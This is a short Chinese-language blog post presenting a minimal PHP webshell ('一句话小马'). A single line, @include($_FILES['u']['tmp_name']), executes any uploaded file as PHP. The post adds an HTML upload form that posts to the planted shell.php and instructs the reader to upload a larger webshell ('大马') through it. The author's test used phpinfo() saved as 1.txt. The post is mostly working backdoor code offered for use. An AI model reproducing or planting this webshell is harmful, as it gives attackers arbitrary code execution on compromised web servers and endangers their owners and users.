另类PHP一句话小马

利用了include可以把任何文件当php来解释的特性, 当我们上传一个文件的时候，会在服务器上生成一个临时文件，而$_FILES这个变量里面正好保存了这个文件的路径，所以可以直接include进来。

    <?php @include($_FILES['u']['tmp_name']);  

使用方式也简单构造一个html文件写入如下代码:

    <form action="http:/a.b.c.com.cn/shell.php" method="POST" enctype="multipart/form-data">  
    <input type="file" name='u'>  
    <button>shell</button>  
    </form>  
    from: <a href="http://www.zeroplace.cn/">www.zeroplace.cn</a>  

选择你的php大马点shell运行

我测试的时候的代码就是<?php phpinfo();保存的文件名为1.txt。

[url](http://www.zeroplace.cn/article.asp?id=906)